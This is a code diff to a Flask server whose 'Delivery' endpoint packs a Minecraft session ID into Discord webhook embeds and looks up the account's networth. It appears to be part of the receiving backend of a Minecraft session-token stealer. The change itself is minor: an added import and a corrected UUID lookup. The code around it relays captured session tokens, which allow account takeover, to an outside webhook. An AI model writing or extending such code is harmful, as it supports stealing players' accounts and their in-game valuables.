@@ -9,6 +9,8 @@ from flask import Flask, request
 from flask_restful import Api, Resource
 import requests
 
+from utils import networth
+
 load_dotenv()
 wh = os.getenv('WEBHOOK')
 
@@ -95,7 +97,7 @@ class Delivery(Resource):
         mc_embed.add_embed_field(name="Session ID", value=cb + mc['ssid'] + cb, inline=False)
         embeds.append(mc_embed)
 
-        profile_data = networth.get_profiles(args["minecraft"]["uuid"])
+        profile_data = networth.get_profiles(mc["uuid"])
 
         if profile_data:
             nw_embed = DiscordEmbed(title=config['nw_embed_title'],
